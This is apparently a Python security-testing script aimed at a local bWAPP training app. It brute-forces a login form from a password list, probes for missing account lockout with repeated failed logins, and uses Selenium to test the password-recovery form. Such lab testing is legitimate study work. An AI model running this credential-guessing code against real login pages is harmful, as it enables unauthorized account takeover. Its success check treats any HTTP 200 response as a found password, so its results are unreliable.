import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# Function to load passwords from a file
def load_passwords(file_path):
    with open(file_path, 'r') as file:
        passwords = file.read().splitlines()
    return passwords

# Function to check for common weak passwords
def check_common_passwords(url, username, passwords):
    for password in passwords:
        response = requests.post(url, data={'username': username, 'password': password})
        if response.status_code == 200:
            message = f"Weak password found: {password}"
            print(message)
            return True, message
    return False, "No weak passwords found."

# Brute force attack simulation
def brute_force_attack(url, username, password_list):
    for password in password_list:
        response = requests.post(url, data={'username': username, 'password': password})
        if response.status_code == 200:
            message = f"Password found: {password}"
            print(message)
            return True, message
    return False, "No passwords found via brute force."

# Checking for account lockout mechanism
def check_account_lockout(url, username):
    for i in range(10):
        response = requests.post(url, data={'username': username, 'password': 'wrongpassword'})
        if response.status_code == 429:  # Too Many Requests
            message = "Account lockout mechanism detected."
            print(message)
            return False, message  # Changed to False since this is not a vulnerability
    message = "No account lockout mechanism detected."
    print(message)
    return True, message  # Changed to True since this is a vulnerability

# Check for password recovery vulnerabilities
def check_password_recovery(url):
    driver = webdriver.Chrome()
    driver.get(url)
    
    try:
        recovery_link = driver.find_element(By.LINK_TEXT, 'Forgot Password')
        recovery_link.click()
        time.sleep(2)  # Wait for the page to load
        
        # Attempt to submit a recovery form with a known username/email
        recovery_email_input = driver.find_element(By.NAME, 'email')  # Adjust this selector as needed
        recovery_email_input.send_keys('test@example.com')  # Use a test email
        recovery_email_input.send_keys(Keys.RETURN)
        time.sleep(2)  # Wait for the response
        
        # Check for indicative messages
        recovery_message = driver.find_element(By.TAG_NAME, 'body').text
        if 'email sent' in recovery_message.lower() or 'check your inbox' in recovery_message.lower():
            print("Password recovery functionality seems secure.")
        else:
            print("Potential issue with password recovery functionality.")
    except Exception as e:
        print(f"Error checking password recovery: {e}")
    finally:
        driver.quit()

# Combine functions and execute
def main():
    target_url = 'http://localhost/bWAPP/ba_weak_pwd.php'  # Replace with the actual login URL
    username = 'bee'
    password_file = 'common-password.txt'
    
    # Load passwords from file
    passwords = load_passwords(password_file)
    
    # Check for common weak passwords
    vulnerabilities_found, description = check_common_passwords(target_url, username, passwords)
    print(description)
    
    # Simulate brute force attack
    vulnerabilities_found, description = brute_force_attack(target_url, username, passwords)
    print(description)
    
    # Check for account lockout mechanism
    vulnerabilities_found, description = check_account_lockout(target_url, username)
    print(description)
    
    # Check for password recovery vulnerabilities
    check_password_recovery(target_url)

if __name__ == "__main__":
    main()
